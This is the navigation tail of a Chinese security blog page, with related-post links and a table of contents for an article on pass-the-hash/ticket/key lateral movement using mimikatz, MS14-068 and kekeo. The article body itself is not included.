fa-fw"></i> 2022-03-30</div><div class="title">MSF和CS联动</div></div></a></div><div><a href="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/" title="域横向CobaltStrike&SPN&RDP"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-12</div><div class="title">域横向CobaltStrike&SPN&RDP</div></div></a></div><div><a href="/2022/03/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91smb&wmi%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92/" title="域横向smb&wmi明文或hash传递"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-10</div><div class="title">域横向smb&wmi明文或hash传递</div></div></a></div><div><a href="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/" title="域横向批量at&schtasks&impacket"><img class="cover" src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-09</div><div class="title">域横向批量at&schtasks&impacket</div></div></a></div><div><a href="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/" title="域横向内网漫游Socks代理技术"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-12</div><div class="title">域横向内网漫游Socks代理技术</div></div></a></div><div><a href="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/" title="域环境&工作组&局域网探针方式"><img class="cover" src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-09</div><div class="title">域环境&工作组&局域网探针方式</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH-amp-PTT-amp-PTK"><span class="toc-number">1.1.</span> <span class="toc-text">PTH&amp;PTT&amp;PTK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH%E5%92%8CPTK"><span class="toc-number">1.2.</span> <span class="toc-text">PTH和PTK</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93KB2871997%E8%A1%A5%E4%B8%81%E5%90%8E%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">总结KB2871997补丁后的影响</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTT"><span class="toc-number">1.3.</span> <span class="toc-text">PTT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE%E5%B7%A5%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">Kerberos协议工作方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8PTH%E4%BC%A0%E9%80%92-mimikatz"><span class="toc-number">2.</span> <span class="toc-text">域横向移动PTH传递-mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8PTK%E4%BC%A0%E9%80%92-mimikatz"><span class="toc-number">3.</span> <span class="toc-text">域横向移动PTK传递-mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8PTT%E4%BC%A0%E9%80%92-MS14068-amp-kekeo-amp-local"><span class="toc-number">4.</span> <span class="toc-text">域横向移动PTT传递-MS14068&amp;kekeo&amp;local</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ems14-068"><span class="toc-number">4.0.1.</span> <span class="toc-text">第一种利用漏洞ms14-068</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7kekeo"><span class="toc-number">4.1.</span> <span class="toc-text">第二种利用工具kekeo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%A5%A8%E6%8D%AE%EF%BC%88%E9%9C%80%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">第三种利用本地票据（需管理权限）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BD%E4%BA%A7Ladon%E5%86%85%E7%BD%91%E6%9D%80%E5%99%A8%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%8C%E8%BF%9E%E6%8E%A5%E7%AD%89"><span class="toc-number">5.</span> <span class="toc-text">国产Ladon内网杀器测试-信息收集，连接等</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E6%BA%90"><span class="toc-number">7.</span> <span class="toc-text">资源</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 1ceC0la</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
